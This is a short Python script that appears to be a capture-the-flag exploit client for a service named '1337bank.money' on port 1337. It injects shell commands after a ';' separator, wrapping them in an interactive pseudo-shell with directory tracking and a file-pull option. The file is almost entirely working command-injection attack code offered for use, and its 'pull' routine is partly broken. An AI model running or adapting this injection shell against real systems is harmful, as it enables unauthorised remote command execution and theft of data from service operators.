

import socket
import time


host = "1337bank.money"  # IP address here
port = 1337  # Port here
dir_location = "/"
prev_location = " "

def show_help():
    print ("shell")
    print ("pull")
    print ("help ")
    print ("quit")

def open_shell():
    global dir_location, prev_location, prev_command
    prev_command = ''
    cmd = input(dir_location+"> ")
    while cmd != "exit":
        if "cd" in cmd:
            if ".." in cmd:
                dir_location = prev_location
            else:
                cd_arr = cmd.split(' ')
                prev_location = dir_location
                dir_location = cd_arr[1]
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.recv(1024)
                s.send(("+none ;cd " + dir_location + "\n").encode())
                prev_command = ";cd " + dir_location
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.recv(1024)
            s.send(("+none " + prev_command + ";" + cmd + "\n").encode())
            time.sleep(2)
            data = s.recv(1024)
            print(data.decode())
        cmd = input(dir_location+"> ")


def shell():
    cmd_com = input("> ").split(' ')
    cmd = cmd_com[0]
    while cmd != "quit":
        if(cmd == "shell"):
            open_shell()
        elif(cmd == "pull"):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            s.recv(1024)
            time.sleep(2)
            data = s.recv(1024)
            file = open(cmd_com[2], "w")
            file.write(data.decode())
        else:
            show_help()
        cmd = input("> ")


if __name__ == '__main__':
    shell()

